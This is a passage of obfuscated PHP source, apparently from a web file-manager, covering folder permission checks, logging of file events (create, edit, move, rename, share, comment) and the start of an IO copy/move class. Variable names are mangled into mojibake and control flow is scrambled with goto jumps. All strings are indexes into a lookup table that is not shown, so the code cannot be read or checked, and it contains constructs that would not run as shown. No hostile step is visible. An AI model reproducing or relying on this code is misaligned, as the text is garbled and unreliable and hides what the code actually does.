‚))->select(); $aÁÙÍº½©É = array(); if (!$DŒÅà­›ô¤) { return $aÁÙÍº½©É; } foreach ($DŒÅà­›ô¤ as $b½‘Ø³À¯ì) { $DäÌ™³ëÜ = $this->authInfo($b½‘Ø³À¯ì); if (AuthModel::authCheckRoot($DäÌ™³ëÜ[$E¥–áÙ÷¯´[372]])) { $aÁÙÍº½©É[] = $b½‘Ø³À¯ì[$E¥–áÙ÷¯´[1409]]; } } return $aÁÙÍº½©É; } private function authFolderOwnerUser($A²àšÔ±Ëƒ) { $EİºˆÑÖÑ =& $_SERVER[»„]; $aÛ é¿†† = array(); $EˆéÁĞÎğì = !1; foreach ($A²àšÔ±Ëƒ as $eé¸‘÷¢“) { $b‚á†Ú†Û = $this->authInfo($eé¸‘÷¢“); if ($eé¸‘÷¢“[$EİºˆÑÖÑ[452]] == $EİºˆÑÖÑ[464]) { $EˆéÁĞÎğì = !0; } if ($eé¸‘÷¢“[$EİºˆÑÖÑ[367]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($b‚á†Ú†Û[$EİºˆÑÖÑ[372]])) { $aÛ é¿††[] = $eé¸‘÷¢“[$EİºˆÑÖÑ[452]]; } } } return array($EİºˆÑÖÑ[531] => $aÛ é¿††, $EİºˆÑÖÑ[2237] => $EˆéÁĞÎğì); } public function authMake($FÒÓ¡õïØí) { goto cˆ£÷±ìßŞ; B¹¾ÉÖºšƒ: $fÖ­è©´Âñ = 0; $eÍÆÓ£—² = 0; $aøÔËÁùÇç = 0; goto bØÄÈ†¦å; CĞÍ¡„¶‹œ: $d‘Çõôç†ù = $eÍÆÓ£—² ? $A±ˆ•“Ÿ¡“ : ($aøÔËÁùÇç ? $b§ø»˜ŒÈ : $a®ÚÆ²²Õ…); $f¾¨Úõù‹ = $eÍÆÓ£—² ? $cÂòóççŒò : ($aøÔËÁùÇç ? $B¸»Ü‹‡Ğ : $fÖ­è©´Âñ); $fƒ«£ªí = $eÍÆÓ£—² ? $EÃ£® ³‹©[2239] : ($aøÔËÁùÇç ? $EÃ£® ³‹©[2240] : ($fÑ‚Á¦¤ôŒ ? $EÃ£® ³‹©[2241] : $EÃ£® ³‹©[357])); goto C‰“†¯ñ ; CËÆãÆå: $a®ÚÆ²²Õ… = 0; $cÂòóççŒò = 0; $B¸»Ü‹‡Ğ = 0; goto B¹¾ÉÖºšƒ; C‰“†¯ñ : $bÎô‹¶íä = array($EÃ£® ³‹©[2230] => intval($d‘Çõôç†ù), $EÃ£® ³‹©[2231] => $f¾¨Úõù‹, $EÃ£® ³‹©[2225] => array($EÃ£® ³‹©[384] => $fƒ«£ªí, $EÃ£® ³‹©[75] => $Aé™Ó…Äê[$EÃ£® ³‹©[365]])); return $bÎô‹¶íä; goto dÜ²£Š®Ö’; bØÄÈ†¦å: $fÑ‚Á¦¤ôŒ = 0; $Aé™Ó…Äê = array($EÃ£® ³‹©[365] => 0); foreach ($FÒÓ¡õïØí as $Aé™Ó…Äê) { $f¾¨Úõù‹ = $this->authInfo($Aé™Ó…Äê); $f¤„§˜™™ƒ = $Aé™Ó…Äê[$EÃ£® ³‹©[452]]; $fé‰‘ó¿—ã = intval($f¾¨Úõù‹[$EÃ£® ³‹©[372]]); if ($Aé™Ó…Äê[$EÃ£® ³‹©[367]] == SourceModel::TYPE_USER && $f¤„§˜™™ƒ == USER_ID) { $eÍÆÓ£—² = !0; $cÂòóççŒò = $f¾¨Úõù‹; $A±ˆ•“Ÿ¡“ = $fé‰‘ó¿—ã; } else { if ($Aé™Ó…Äê[$EÃ£® ³‹©[367]] == SourceModel::TYPE_GROUP && in_array($f¤„§˜™™ƒ, $f…‘Ÿ÷É—)) { $aøÔËÁùÇç = !0; if ($fé‰‘ó¿—ã >= $b§ø»˜ŒÈ) { $b§ø»˜ŒÈ = $fé‰‘ó¿—ã; $B¸»Ü‹‡Ğ = $f¾¨Úõù‹; } } else { if ($f¤„§˜™™ƒ == $EÃ£® ³‹©[464]) { $fÑ‚Á¦¤ôŒ = !0; $fÖ­è©´Âñ = $f¾¨Úõù‹; $a®ÚÆ²²Õ… = $fé‰‘ó¿—ã; } } } } goto CĞÍ¡„¶‹œ; AÒ™§—£Ú³: $f…‘Ÿ÷É— = array_to_keyvalue($F†´Á†«ŞÎ, $EÃ£® ³‹©[33], $EÃ£® ³‹©[2072]); $A±ˆ•“Ÿ¡“ = 0; $b§ø»˜ŒÈ = 0; goto CËÆãÆå; cˆ£÷±ìßŞ: $EÃ£® ³‹© =& $_SERVER[»„]; if (!$FÒÓ¡õïØí) { return array($EÃ£® ³‹©[373] => 0, $EÃ£® ³‹©[414] => !1); } $F†´Á†«ŞÎ = Session::get($EÃ£® ³‹©[2184]); goto AÒ™§—£Ú³; dÜ²£Š®Ö’: } public function authTargetInfoMake($b¢Œ¿ºÒÇ²) { goto a±ê¶Ÿêô«; B»ìšÑ÷¥È: return array($B£õ†¨°½[2242] => $B³¸Ã£®Ä˜, $B£õ†¨°½[2233] => $EÍêÔ»òâ­); goto DøŞ¥Â‰İ; a±ê¶Ÿêô«: $B£õ†¨°½ =& $_SERVER[»„]; $B³¸Ã£®Ä˜ = array(); $EÍêÔ»òâ­ = array(); goto BèÜåÚ‚ó«; BèÜåÚ‚ó«: foreach ($b¢Œ¿ºÒÇ² as $A¼‡ø¨¥„) { if ($A¼‡ø¨¥„[$B£õ†¨°½[367]] == SourceModel::TYPE_USER) { $B³¸Ã£®Ä˜[] = intval($A¼‡ø¨¥„[$B£õ†¨°½[452]]); } else { if ($A¼‡ø¨¥„[$B£õ†¨°½[367]] == SourceModel::TYPE_GROUP) { $EÍêÔ»òâ­[] = intval($A¼‡ø¨¥„[$B£õ†¨°½[452]]); } } } if ($B³¸Ã£®Ä˜) { $B³¸Ã£®Ä˜ = Model($B£õ†¨°½[470])->userListInfo($B³¸Ã£®Ä˜); } if ($EÍêÔ»òâ­) { $BÇ¸¼´ÔÖ = array($B£õ†¨°½[2144] => array($B£õ†¨°½[380], $EÍêÔ»òâ­)); $EÍêÔ»òâ­ = Model($B£õ†¨°½[454])->field($B£õ†¨°½[2157])->where($BÇ¸¼´ÔÖ)->select(); $EÍêÔ»òâ­ = array_to_keyvalue($EÍêÔ»òâ­, $B£õ†¨°½[2072]); } goto B»ìšÑ÷¥È; DøŞ¥Â‰İ: } private function authInfo($bâ¶áÁÆ) { $EÂÇò¤ÛùÑ =& $_SERVER[»„]; if ($bâ¶áÁÆ[$EÂÇò¤ÛùÑ[2200]]) { $eîÓ¤¯‹‹Á = Model($EÂÇò¤ÛùÑ[2219])->listData($bâ¶áÁÆ[$EÂÇò¤ÛùÑ[2200]]); if (!$eîÓ¤¯‹‹Á) { return !1; $E§º¡„èÊÄ = Model($EÂÇò¤ÛùÑ[2219])->listData(); $F­Â½‘õ­ = array_filter_by_field($E§º¡„èÊÄ, $EÂÇò¤ÛùÑ[372], $EÂÇò¤ÛùÑ[464]); return $F­Â½‘õ­; } $EŒë·‡‘¦¹ = array_field_key($eîÓ¤¯‹‹Á, array($EÂÇò¤ÛùÑ[363], $EÂÇò¤ÛùÑ[28], $EÂÇò¤ÛùÑ[372], $EÂÇò¤ÛùÑ[2090], $EÂÇò¤ÛùÑ[2093])); $EŒë·‡‘¦¹[$EÂÇò¤ÛùÑ[2243]] = $bâ¶áÁÆ; return $EŒë·‡‘¦¹; } else { return array($EÂÇò¤ÛùÑ[381] => 0, $EÂÇò¤ÛùÑ[2078] => $bâ¶áÁÆ[$EÂÇò¤ÛùÑ[2201]], $EÂÇò¤ÛùÑ[382] => $EÂÇò¤ÛùÑ[33], $EÂÇò¤ÛùÑ[2090] => $EÂÇò¤ÛùÑ[2244]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\x72\x63\145\137\x65\x76\x65\x6e\x74"; protected $dataAuto = array(array("\143\x72\x65\141\164\145\124\151\x6d\145", "\164\151\x6d\145", "\x69\156\x73\x65\162\x74", "\146\x75\x6e\x63\x74\x69\157\x6e"), array("\x64\x65\x73\x63", '', "\x69\156\163\145\x72\164\54\165\160\x64\141\164\x65\54\163\145\x6c\x65\x63\164", "\x6a\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($eâ’¾äÍæ, $FŞ…í¶•œÚ, $D×¸¸ «‹… = '') { goto f½‰£¨Ô–Œ; eš©Æ¾ø…‚: if (!$BÄ­Šæ—Ê) { return !1; } if ($this->isCacheEvent($BÄ­Šæ—Ê, $FŞ…í¶•œÚ)) { return; } if ($D×¸¸ «‹… && is_string($D×¸¸ «‹…)) { $D×¸¸ «‹… = array($BÈãÅ•ÄÆÓ[2102] => $D×¸¸ «‹…); } goto A••îÆÇ; A••îÆÇ: $F–ªï¹¹Á° = array($BÈãÅ•ÄÆÓ[379] => $eâ’¾äÍæ, $BÈãÅ•ÄÆÓ[2245] => $BÄ­Šæ—Ê[$BÈãÅ•ÄÆÓ[457]], $BÈãÅ•ÄÆÓ[2246] => $BÄ­Šæ—Ê[$BÈãÅ•ÄÆÓ[28]], $BÈãÅ•ÄÆÓ[462] => $BÄ­Šæ—Ê[$BÈãÅ•ÄÆÓ[462]], $BÈãÅ•ÄÆÓ[1400] => USER_ID, $BÈãÅ•ÄÆÓ[384] => $FŞ…í¶•œÚ, $BÈãÅ•ÄÆÓ[1402] => $D×¸¸ «‹…); $this->addSystemLog($FŞ…í¶•œÚ, $F–ªï¹¹Á°); return $this->add($F–ªï¹¹Á°); goto båô“º ù©; f½‰£¨Ô–Œ: $BÈãÅ•ÄÆÓ =& $_SERVER[»„]; if (!$this->eventSave) { return; } $BÄ­Šæ—Ê = Model($BÈãÅ•ÄÆÓ[1098])->sourceInfo($eâ’¾äÍæ); goto eš©Æ¾ø…‚; båô“º ù©: } private function addSystemLog($bÒŠ‡âòæ¯, $D¡àÂŒ†ê) { $AÁ‹øËÃÌ§ =& $_SERVER[»„]; if ($bÒŠ‡âòæ¯ == $AÁ‹øËÃÌ§[2247]) { $bÒŠ‡âòæ¯ = $D¡àÂŒ†ê[$AÁ‹øËÃÌ§[401]][$AÁ‹øËÃÌ§[2248]]; } else { if (in_array($bÒŠ‡âòæ¯, array($AÁ‹øËÃÌ§[2049], $AÁ‹øËÃÌ§[2249]))) { $bÒŠ‡âòæ¯ = $D¡àÂŒ†ê[$AÁ‹øËÃÌ§[401]][$AÁ‹øËÃÌ§[680]]; } } $E‘¬Š¬àçÏ = array_merge($D¡àÂŒ†ê, array($AÁ‹øËÃÌ§[2250] => $D¡àÂŒ†ê[$AÁ‹øËÃÌ§[365]], $AÁ‹øËÃÌ§[2251] => $D¡àÂŒ†ê[$AÁ‹øËÃÌ§[2251]])); Model($AÁ‹øËÃÌ§[2013])->addLog($AÁ‹øËÃÌ§[2252] . $bÒŠ‡âòæ¯, $E‘¬Š¬àçÏ); } private function isCacheEvent($f¨í†Â¶Á, $A×Àì ô‘ˆ) { if ($f¨í†Â¶Á[$_SERVER[»„][367]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($eœ†“ä‘¬¼, $C·µÁíî¸ê) { $fÉâÀ×ô» =& $_SERVER[»„]; $f‰ôšÄß°— = Model($fÉâÀ×ô»[1098])->sourceInfo($eœ†“ä‘¬¼); $E¨øº„È = array($fÉâÀ×ô»[2248] => $C·µÁíî¸ê, $fÉâÀ×ô»[28] => $f‰ôšÄß°—[$fÉâÀ×ô»[28]]); return $this->addEvent($eœ†“ä‘¬¼, $fÉâÀ×ô»[2247], $E¨øº„È); } public function eventFileEdit($bï¯¯Ë) { $b—êÙŠÇÖä =& $_SERVER[»„]; $eÀ‰™Çµ‚ï = array($b—êÙŠÇÖä[2253] => $_SERVER[$b—êÙŠÇÖä[2254]], $b—êÙŠÇÖä[1719] => strtolower(ACTION)); return $this->addEvent($bï¯¯Ë, $b—êÙŠÇÖä[2040], $eÀ‰™Çµ‚ï); } public function eventRecycle($E«³©ãêé, $D¥İö×…ÏÊ) { return $this->addEvent($E«³©ãêé, $_SERVER[»„][2249], $D¥İö×…ÏÊ); } public function eventRemove($b¬±‚¢ö²) { $cˆÙ§„¢Á =& $_SERVER[»„]; $BïÔ½ùÍ‰ = Model($cˆÙ§„¢Á[1098])->sourceInfo($b¬±‚¢ö²); $d£ä’øÀ = $BïÔ½ùÍ‰[$cˆÙ§„¢Á[28]]; return $this->addEvent($BïÔ½ùÍ‰[$cˆÙ§„¢Á[457]], $cˆÙ§„¢Á[2039], $d£ä’øÀ); } public function eventShare($EÆÀ »ë ‰, $eÂ°«·¤‹‡) { return $this->addEvent($EÆÀ »ë ‰, $_SERVER[»„][2049], $eÂ°«·¤‹‡); } public function eventMove($eîÌ³¤„“„, $fÏï«†¶Éî, $Fˆ‹…ö¡”) { goto F¯Ñ¹ªìºÒ; F¯Ñ¹ªìºÒ: $fø¿»Û®†§ =& $_SERVER[»„]; $aïñõµÏùÃ = Model($fø¿»Û®†§[1098]); $B°ŸéÍœ—Á = $aïñõµÏùÃ->sourceInfo($eîÌ³¤„“„); goto A³»§ÄÄ‰ê; B¬ĞŠâÊæ: $this->addEvent($fÏï«†¶Éî, $fø¿»Û®†§[2259], $fÏ¯Ç¢±Ëõ); goto aÎ‘¡”Œèò; FÇ•ÁÃ ö: $this->addEvent($eîÌ³¤„“„, $fø¿»Û®†§[488], $fÏ¯Ç¢±Ëõ); $B°ŸéÍœ—Á = $aïñõµÏùÃ->sourceInfo($eîÌ³¤„“„); $fÏ¯Ç¢±Ëõ = array($fø¿»Û®†§[365] => $B°ŸéÍœ—Á[$fø¿»Û®†§[365]], $fø¿»Û®†§[28] => $B°ŸéÍœ—Á[$fø¿»Û®†§[28]]); goto B¬ĞŠâÊæ; A³»§ÄÄ‰ê: $Dì¯ìÒÍ = $aïñõµÏùÃ->sourceInfo($fÏï«†¶Éî); $c±ïùÅÑ¥é = $aïñõµÏùÃ->sourceInfo($Fˆ‹…ö¡”); $fÏ¯Ç¢±Ëõ = array($fø¿»Û®†§[994] => $fÏï«†¶Éî, $fø¿»Û®†§[2255] => $Dì¯ìÒÍ[$fø¿»Û®†§[28]], $fø¿»Û®†§[2256] => $Dì¯ìÒÍ[$fø¿»Û®†§[462]], $fø¿»Û®†§[995] => $Fˆ‹…ö¡”, $fø¿»Û®†§[2257] => $c±ïùÅÑ¥é[$fø¿»Û®†§[28]], $fø¿»Û®†§[2258] => $c±ïùÅÑ¥é[$fø¿»Û®†§[462]]); goto FÇ•ÁÃ ö; aÎ‘¡”Œèò: } public function eventCopy($eù¹ŒÖêÁ) { $this->eventCreate($eù¹ŒÖêÁ, $_SERVER[»„][486]); } public function eventRename($dƒíğ¥•éá, $b–â•ç¤Ú, $cìğå²šç‰) { $FéÈ…»¯Ò =& $_SERVER[»„]; $dæÈ½Ïù’à = array($FéÈ…»¯Ò[994] => $b–â•ç¤Ú, $FéÈ…»¯Ò[995] => $cìğå²šç‰); return $this->addEvent($dƒíğ¥•éá, $FéÈ…»¯Ò[1110], $dæÈ½Ïù’à); } public function eventAddComment($F²¤šÉÅ”‚, $d”íƒÌ¦Ğ) { return $this->addEvent($F²¤šÉÅ”‚, $_SERVER[»„][2260], $d”íƒÌ¦Ğ); } public function eventAddDesc($dÛ»Ëš°Ú¶, $a°²ÁÑ¼½Ä) { return $this->addEvent($dÛ»Ëš°Ú¶, $_SERVER[»„][2261], $a°²ÁÑ¼½Ä); } public function listBySource($E§ˆÌ½Îœ) { goto Aéê˜ùõÑï; Aéê˜ùõÑï: $e„¤½Çî =& $_SERVER[»„]; $c¼ßë·°¼¯ = Model($e„¤½Çî[1098])->sourceInfo($E§ˆÌ½Îœ); $FŒÀØœ¾ = array($e„¤½Çî[379] => $E§ˆÌ½Îœ); goto e¸“¼ÔÑ‰; AéŒ©‰Àõ: $DîÕè°– = $this->eventListParse($DîÕè°–, $E§ˆÌ½Îœ); show_json($DîÕè°–); goto eÅ‰Á’‚áÁ; e¸“¼ÔÑ‰: if ($c¼ßë·°¼¯[$e„¤½Çî[366]] == $e„¤½Çî[83]) { $a¿‘Ê˜™é« = Model($e„¤½Çî[1098])->listSearchChildren($E§ˆÌ½Îœ, 20000); $a¿‘Ê˜™é«[] = $E§ˆÌ½Îœ . $e„¤½Çî[357]; $FŒÀØœ¾ = array($e„¤½Çî[365] => array($e„¤½Çî[7], $a¿‘Ê˜™é«)); } $DîÕè°– = $this->where($FŒÀØœ¾)->order($e„¤½Çî[2262])->selectPage(); if ($DîÕè°–[$e„¤½Çî[347]][$e„¤½Çî[348]] == 0) { $DîÕè°–[$e„¤½Çî[347]][$e„¤½Çî[348]] = 1; $DîÕè°–[$e„¤½Çî[350]] = array(array($e„¤½Çî[379] => $E§ˆÌ½Îœ, $e„¤½Çî[2245] => $c¼ßë·°¼¯[$e„¤½Çî[457]], $e„¤½Çî[1400] => $c¼ßë·°¼¯[$e„¤½Çî[374]], $e„¤½Çî[384] => $e„¤½Çî[2263], $e„¤½Çî[385] => $c¼ßë·°¼¯[$e„¤½Çî[183]], $e„¤½Çî[1402] => $e„¤½Çî[33])); } goto AéŒ©‰Àõ; eÅ‰Á’‚áÁ: } private function eventListParse($b¦§ã“Ñè, $D‰éÄÉ©­°) { goto A¿ØÉ‰æ÷; a³¤…œÖÚ¡: $F“êéñƒ¡ = array_to_keyvalue($C¥¤«¦êç˜, $CÑÂ…•†ªˆ[33], $CÑÂ…•†ªˆ[2251]); foreach ($C¥¤«¦êç˜ as $fğŒ‘†Ğ±Ÿ) { $e¬­…•ÎÇˆ = $fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[401]]; if ($fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[29]] == $CÑÂ…•†ªˆ[488] && isset($e¬­…•ÎÇˆ[$CÑÂ…•†ªˆ[994]])) { $fèµµ”·¡[] = $e¬­…•ÎÇˆ[$CÑÂ…•†ªˆ[994]] . $CÑÂ…•†ªˆ[33]; $fèµµ”·¡[] = $e¬­…•ÎÇˆ[$CÑÂ…•†ªˆ[995]] . $CÑÂ…•†ªˆ[33]; } if ($fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[29]] == $CÑÂ…•†ªˆ[2259] && isset($e¬­…•ÎÇˆ[$CÑÂ…•†ªˆ[365]])) { $fèµµ”·¡[] = $e¬­…•ÎÇˆ[$CÑÂ…•†ªˆ[365]] . $CÑÂ…•†ªˆ[33]; } } $fèµµ”·¡ = array_merge($fèµµ”·¡, $F“êéñƒ¡, array($D‰éÄÉ©­° . $CÑÂ…•†ªˆ[33])); goto B°„ÅšÊ´ö; B°„ÅšÊ´ö: $fèµµ”·¡ = array_unique($fèµµ”·¡); $E‰œĞ£åª½ = array_unique(array_to_keyvalue($C¥¤«¦êç˜, $CÑÂ…•†ªˆ[33], $CÑÂ…•†ªˆ[1409])); $f ‡ªŒ–ˆÔ = Model($CÑÂ…•†ªˆ[473])->userListInfo($E‰œĞ£åª½); goto f—İ´§Ñà; A¿ØÉ‰æ÷: $CÑÂ…•†ªˆ =& $_SERVER[»„]; $C¥¤«¦êç˜ = $b¦§ã“Ñè[$CÑÂ…•†ªˆ[350]]; $fèµµ”·¡ = array_to_keyvalue($C¥¤«¦êç˜, $CÑÂ…•†ªˆ[33], $CÑÂ…•†ªˆ[365]); goto a³¤…œÖÚ¡; f—İ´§Ñà: $b¸ÁÖ³ƒ = Model($CÑÂ…•†ªˆ[740])->sourceListInfo($fèµµ”·¡, !0); foreach ($C¥¤«¦êç˜ as &$fğŒ‘†Ğ±Ÿ) { if ($fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[29]] == $CÑÂ…•†ªˆ[488] && isset($fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[401]][$CÑÂ…•†ªˆ[994]])) { $fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[401]][$CÑÂ…•†ªˆ[994]] = $b¸ÁÖ³ƒ[$fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[401]][$CÑÂ…•†ªˆ[994]]]; $fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[401]][$CÑÂ…•†ªˆ[995]] = $b¸ÁÖ³ƒ[$fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[401]][$CÑÂ…•†ªˆ[995]]]; } if ($fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[29]] == $CÑÂ…•†ªˆ[2259] && isset($fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[401]][$CÑÂ…•†ªˆ[365]])) { $fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[401]][$CÑÂ…•†ªˆ[365]] = $b¸ÁÖ³ƒ[$fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[401]][$CÑÂ…•†ªˆ[365]]]; } $fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[387]] = $b¸ÁÖ³ƒ[$fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[365]]]; $fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[2264]] = $b¸ÁÖ³ƒ[$fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[2251]]]; if ($fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[29]] == $CÑÂ…•†ªˆ[2039]) { $fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[2264]] = $fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[387]]; $fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[2251]] = $fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[2264]][$CÑÂ…•†ªˆ[365]]; $fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[387]] = !1; $fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[365]] = $CÑÂ…•†ªˆ[33]; } $fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[2209]] = $f ‡ªŒ–ˆÔ[$fğŒ‘†Ğ±Ÿ[$CÑÂ…•†ªˆ[1409]]]; } $b¦§ã“Ñè[$CÑÂ…•†ªˆ[350]] = $C¥¤«¦êç˜; goto d‘ÄùÎ˜¡; d‘ÄùÎ˜¡: return $b¦§ã“Ñè; goto cîèÁ×ò´…; cîèÁ×ò´…: } public function removeBySource($B¼Üã¿®) { $b…å ¬˜–³ = array($_SERVER[»„][379] => $B¼Üã¿®); $this->where($b…å ¬˜–³)->remove(); } } goto Fğ¤—‚Ã‡‹; FŒ‡†´ÍÛ: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($F™¡šê¬¹š, $e×¨¬ÜÕ¬ä) { $CÔÁŞ·Ë®Ï = self::driverMake($e×¨¬ÜÕ¬ä[0]); if (method_exists($CÔÁŞ·Ë®Ï, $F™¡šê¬¹š)) { return @call_user_func_array(array($CÔÁŞ·Ë®Ï, $F™¡šê¬¹š), $e×¨¬ÜÕ¬ä); } if (method_exists($CÔÁŞ·Ë®Ï, $_SERVER[»„][985])) { return @call_user_func_array(array($CÔÁŞ·Ë®Ï, $F™¡šê¬¹š), $e×¨¬ÜÕ¬ä); } else { if (method_exists(self, $F™¡šê¬¹š)) { return @call_user_func_array(array(self, $F™¡šê¬¹š), $e×¨¬ÜÕ¬ä); } else { call_user_func_array(array(parent, $F™¡šê¬¹š), $e×¨¬ÜÕ¬ä); } } } public static function init($Fææ›Ëø) { return self::driverMake($Fææ›Ëø); } public static function copy($Cô„–ĞğÒ, $A÷Çƒƒ·À£, $dŸ‘ö‘õÏ÷ = false, $f”ß’”¡ë = false) { return self::copyMove($Cô„–ĞğÒ, $A÷Çƒƒ·À£, $dŸ‘ö‘õÏ÷, $_SERVER[»„][486], $f”ß’”¡ë); } public static function move($E»¤ƒÈ×, $E—ÎÙ­ïÕË, $b±£ÌàíˆŒ = false, $F¢ÀŠõ™‚ç = false) { return self::copyMove($E»¤ƒÈ×, $E—ÎÙ­ïÕË, $b±£ÌàíˆŒ, $_SERVER[»„][488], $F¢ÀŠõ™‚ç); } public static function saveFile($bğÇ³ñ‰Õ², $bÚ×î¶‚™ñ, $E¼Ùò¬ÛİĞ = true) { goto AÀ‘§‰ˆéĞ; AÀ‘§‰ˆéĞ: $AµçÔÇøÁ =& $_SERVER[»„]; $AÎ½®µ‰¡¢ = self::info($bÚ×î¶‚™ñ); $A…ä«‰„¥ = self::driverMake($bğÇ³ñ‰Õ²); goto E…¢ê‹†Ï‚; E…¢ê‹†Ï‚: $f‰‰è¦Æï = self::driverMake($bÚ×î¶‚™ñ); $AóÉ†íÒ£Î = !1; if ($f‰‰è¦Æï->pathParse[$AµçÔÇøÁ[986]]) { $A…íÓî¯å¸ = $f‰‰è¦Æï->pathParse[$AµçÔÇøÁ[986]]; $AóÉ†íÒ£Î = $f‰‰è¦Æï; $f‰‰è¦Æï = self::driverMake($A…íÓî¯å¸); } goto AØ…´²ƒ“›; C‰éŒÃ‰¬: $bŠÜ‹ŒÈ‚ì = self::copyFile($A…ä«‰„¥, $bğÇ³ñ‰Õ², $f‰‰è¦Æï, $C‚¼ˆÌ¡´, $AÎ½®µ‰¡¢[$AµçÔÇøÁ[28]], $D‹Ğä¦»øå); if ($AóÉ†íÒ£Î) { $bŠÜ‹ŒÈ‚ì = $AóÉ†íÒ£Î->getPathOuter($bŠÜ‹ŒÈ‚ì); } return $bŠÜ‹ŒÈ‚ì; goto cøÍœÍ±¿‡; AØ…´²ƒ“›: $C‚¼ˆÌ¡´ = $f‰‰è¦Æï->pathFather($bÚ×î¶‚™ñ); $D‹Ğä¦»øå = !0; if (!$E¼Ùò¬ÛİĞ && self::driverIsSame($A…ä«‰„¥, $f‰‰è¦Æï)) { $D‹Ğä¦»øå = !1; } goto C‰éŒÃ‰¬; cøÍœÍ±¿‡: } private static function copyMove($D«œ…µÂĞ¬, $b³åØÛ‰Ê, $a¼©†Ÿ„©, $E·é“…„³¡, $AÅ ù²å¿Ğ = false) { goto B…ïÔİ•À¦; AìÁÍÃ¿ç²: $cÕŞÉİ„Û = !1; if ($b…†¢Ç‰¦->pathParse[$CÎÄ‰Ì–É¾[986]]) { $b³åØÛ‰Ê = $b…†¢Ç‰¦->pathParse[$CÎÄ‰Ì–É¾[986]]; $cÕŞÉİ„Û = $b…†¢Ç‰¦; $b…†¢Ç‰¦ = self::driverMake($b³åØÛ‰Ê); } self::check($C¾äåç”ã, $D«œ…µÂĞ¬, $b…†¢Ç‰¦, $b³åØÛ‰Ê); goto aàùñÌÇ; B…ïÔİ•À¦: $CÎÄ‰Ì–É¾ =& $_SERVER[»„]; if (!$D«œ…µÂĞ¬ || $D«œ…µÂĞ¬ == $CÎÄ‰Ì–É¾[8] || !$b³åØÛ‰Ê) { return !1; } ignore_timeout(); goto d¹êïó–Î; C†Ÿˆˆ‚óŞ: $Bë¨èÀ— = $C¾äåç”ã->isFile($D«œ…µÂĞ¬); if (!$Bë¨èÀ— && $b…†¢Ç‰¦->getType() == $CÎÄ‰Ì–É¾[682] && $C¾äåç”ã->getType() == $CÎÄ‰Ì–É¾[101]) { $AÛ‘Ì¯´Ğ‚ = $b…†¢Ç‰¦->copyFolderFromIO($C¾äåç”ã, $D«œ…µÂĞ¬, $b³åØÛ‰Ê, $a¼©†Ÿ„©, $f††»ù¼†, $AÅ ù²å¿Ğ); } else { $AÛ‘Ì¯´Ğ‚ = self::copyPath($C¾äåç”ã, $D«œ…µÂĞ¬, $b…†¢Ç‰¦, $b³åØÛ‰Ê, $a¼©†Ÿ„©, $f††»ù¼†, $Bë¨èÀ—, $AÅ ù²å¿Ğ); } if ($AÛ‘Ì¯´Ğ‚ && $f††»ù¼†) { $C¾äåç”ã->remove($D«œ…µÂĞ¬); } goto E™«°­÷†³; aàùñÌÇ: Hook::trigger($CÎÄ‰Ì–É¾[72], $C¾äåç”ã, $D«œ…µÂĞ¬, $b…†¢Ç‰¦, $b³åØÛ‰Ê); $F«è‡ØÖ—Ü = self::driverIsSame($C¾äåç”ã, $b…†¢Ç‰¦); if ($F«è‡ØÖ—Ü) { if ($E·é“…„³¡ == $CÎÄ‰Ì–É¾[488] && trim($b³åØÛ‰Ê, $CÎÄ‰Ì–É¾[8]) == trim($b…†¢Ç‰¦->pathFather($D«œ…µÂĞ¬), $CÎÄ‰Ì–É¾[8])) { return $b…†¢Ç‰¦->getPathOuter($D«œ…µÂĞ¬); } if (method_exists($b…†¢Ç‰¦, $E·é“…„³¡)) { return $b…†¢Ç‰¦->{$E·é“…„³¡}($D«œ…µÂĞ¬, $b³åØÛ‰Ê, $a¼©†Ÿ„©); } } goto C†Ÿˆˆ‚óŞ; d¹êïó–Î: $C¾äåç”ã = self::driverMake($D«œ…µÂĞ¬); $b…†¢Ç‰¦ = self::driverMake($b³åØÛ‰Ê); $f††»ù¼† = $E·é“…„³¡ == $CÎÄ‰Ì–É¾[488]; goto AìÁÍÃ¿ç²; E™«°­÷†³: if ($cÕŞÉİ„Û) { $AÛ‘Ì¯´Ğ‚ = $cÕŞÉİ„Û->getPathOuter($AÛ‘Ì¯´Ğ‚); } return $AÛ‘Ì¯´Ğ‚; goto BĞè˜¼’…; BĞè˜¼’…: } private static function check($CÃĞ¼¸ô‡, $cëˆ‹µÓ±ì, $Aí‰¶ë¸ù, &$eÁ©Êˆ©Äô) { $a»İˆÇÜùÒ =& $_SERVER[»„]; if (self::driverIsSame($CÃĞ¼¸ô‡, $Aí‰¶ë¸ù) && $CÃĞ¼¸ô‡->isFolder($cëˆ‹µÓ±ì) && 